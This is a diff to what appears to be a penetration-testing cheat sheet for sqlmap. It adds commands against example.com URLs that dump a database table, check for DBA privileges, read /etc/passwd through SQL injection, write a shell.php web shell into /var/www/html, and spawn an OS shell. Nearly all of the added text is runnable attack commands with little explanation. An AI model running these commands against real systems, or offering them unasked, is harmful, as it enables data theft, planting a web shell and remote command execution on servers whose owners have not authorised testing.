@@ -4,8 +4,30 @@
 
 **Note**: Might need to remove some techniques, for example, remove `T` if you want not to test for timing based SQLi.
 
+
+#### Best Command
 ```
 sqlmap -r request.txt --batch --random-agent --level=5 --risk=3 -D <db_name> -T <table_name> --dump --technique=BEUSTQ
+```
+
+#### Check for DBA Privileges
+```
+sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
+```
+
+#### Reading Local File
+```
+sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
+```
+
+#### Writing a file
+```
+sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+```
+
+#### Spawining OS Shell
+```
+sqlmap -u "http://www.example.com/?id=1" --os-shell
 ```
 
 ### Detection
